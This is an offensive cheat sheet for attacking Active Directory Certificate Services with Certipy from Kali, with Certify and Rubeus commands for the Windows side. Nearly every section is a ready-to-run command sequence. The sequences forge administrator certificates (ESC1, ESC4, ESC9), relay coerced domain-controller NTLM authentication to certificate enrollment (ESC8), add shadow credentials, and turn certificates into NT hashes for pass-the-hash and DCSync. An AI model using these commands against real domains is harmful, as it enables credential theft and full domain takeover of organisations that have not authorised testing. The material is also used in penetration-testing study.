# ADCS via Certipy — Linux-Side Certificate Attacks

Certipy is the Python/Linux equivalent of Certify.exe. Run everything from Kali without needing a Windows foothold.

---

## Install Certipy

```bash
pip3 install certipy-ad
# OR:
git clone https://github.com/ly4k/Certipy && cd Certipy && pip3 install .

# Verify:
certipy --help
```

---

## Step 1: Enumerate Vulnerable Templates (from Kali)

```bash
# Find vulnerable templates:
certipy find -u user@corp.com -p 'Password123' -dc-ip 192.168.1.1

# With NTLM hash:
certipy find -u user@corp.com -hashes :NTHASH -dc-ip 192.168.1.1

# Output to text/JSON:
certipy find -u user@corp.com -p 'Password123' -dc-ip 192.168.1.1 -text -json

# Output will highlight ESC1, ESC2, etc. with colored [!] markers
```

---

## ESC1 via Certipy (SAN Extension — Most Common)

```bash
# Request a certificate for Administrator using a vulnerable template:
certipy req -u user@corp.com -p 'Password123' \
    -ca corp-CA \
    -template VulnerableTemplate \
    -upn administrator@corp.com \
    -dc-ip 192.168.1.1

# Output: administrator.pfx (certificate + private key)

# Use the certificate to get a TGT:
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1

# Output:
#   [*] Got hash for 'administrator@corp.com': aad3b435...:NTHASH
#   [*] Saved credential cache to 'administrator.ccache'
```

---

## ESC4 via Certipy (Template ACL Abuse)

```bash
# Check if you have write permission on a template:
certipy find -u user@corp.com -p pass -dc-ip 192.168.1.1 | grep -A5 "ESC4"

# Modify the template to be ESC1-exploitable (adds ENROLLEE_SUPPLIES_SUBJECT):
certipy template -u user@corp.com -p pass -template VulnerableTemplate -save-old -dc-ip 192.168.1.1

# Now exploit as ESC1:
certipy req -u user@corp.com -p pass -ca corp-CA -template VulnerableTemplate -upn administrator@corp.com -dc-ip 192.168.1.1

# Restore template to original state:
certipy template -u user@corp.com -p pass -template VulnerableTemplate -configuration VulnerableTemplate.json -dc-ip 192.168.1.1
```

---

## ESC8 via Certipy (NTLM Relay to ADCS Web Enrollment)

```bash
# Step 1: Start certipy relay (listens for NTLM auth, relays to ADCS):
certipy relay -ca CA.corp.com -template DomainController

# Step 2: Coerce authentication from DC (in another terminal):
# Using PetitPotam:
python3 PetitPotam.py -u user -p pass -d corp.com KALI_IP DC01.corp.com
# OR PrinterBug:
python3 printerbug.py corp.com/user:pass@DC01.corp.com KALI_IP

# Result: certipy saves dc.pfx (DC machine certificate)

# Step 3: Use DC certificate for PKINIT (get DA hash):
certipy auth -pfx dc.pfx -dc-ip 192.168.1.1
# Gets NT hash of DC machine account → use for DCSync
```

---

## Certificate-Based Auth → NT Hash (PKINIT → UnPAC-the-Hash)

```bash
# Any certificate obtained via ESC1-8 can be used for PKINIT:
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1

# Output includes:
#   NT hash: aad3b435b51404eeaad3b435b51404ee:NTHASH
#   .ccache file: administrator.ccache

# Use the hash for PTH:
evil-winrm -i 192.168.1.1 -u administrator -H NTHASH
impacket-psexec corp.com/administrator@DC01.corp.com -hashes :NTHASH

# OR use the ccache for kerberos auth:
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.com/administrator@DC01.corp.com
```

---

## ESC9 & ESC10 — Certificate Mapping Weaknesses

**ESC9:** Template has `CT_FLAG_NO_SECURITY_EXTENSION` — certificates don't include the SID, so they can be used by a different user if the account's UPN is changed.

**ESC10:** Domain controller has `StrongCertificateBindingEnforcement = 0` (disabled enforcement) — same effect.

```bash
# Check if ESC9/10 conditions exist:
certipy find -u user@corp.com -p pass -dc-ip 192.168.1.1 | grep -i "ESC9\|ESC10\|StrongCertificateBinding"

# ESC9 Attack (requires GenericWrite on a user):
# 1. Change target user's UPN to match the admin:
certipy account update -u user@corp.com -p pass -user victim -upn administrator@corp.com -dc-ip 192.168.1.1

# 2. Request certificate as victim (gets cert for "administrator"):
certipy req -u victim@corp.com -p vicpass -ca corp-CA -template VulnerableTemplate -dc-ip 192.168.1.1

# 3. Restore UPN:
certipy account update -u user@corp.com -p pass -user victim -upn victim@corp.com -dc-ip 192.168.1.1

# 4. Authenticate with the cert (still maps to administrator):
certipy auth -pfx victim.pfx -dc-ip 192.168.1.1
```

---

## Shadow Credentials via Certipy

```bash
# Add a shadow credential to a target (requires GenericWrite):
certipy shadow auto -u user@corp.com -p pass -account targetuser -dc-ip 192.168.1.1
# → Automatically adds shadow credential + gets TGT + prints NT hash
```

---

## Certipy Quick Reference

| Command | Purpose |
|---------|---------|
| `certipy find` | Enumerate vulnerable templates |
| `certipy req -upn admin@` | Request cert with SAN (ESC1) |
| `certipy auth -pfx` | Auth with cert → get NT hash + ccache |
| `certipy relay` | NTLM relay to ADCS (ESC8) |
| `certipy template` | Modify template ACL (ESC4) |
| `certipy shadow auto` | Shadow credentials attack |
| `certipy account update -upn` | Change UPN for ESC9 |

---

## Certify.exe (Windows-Side) Quick Commands

```powershell
# Find vulnerable templates:
.\Certify.exe find /vulnerable

# Request with SAN (ESC1):
.\Certify.exe request /ca:DC01.corp.com\corp-CA /template:VulnTemplate /altname:administrator

# Convert PEM output to PFX (on Kali):
# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use PFX with Rubeus:
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<export_password> /ptt
```
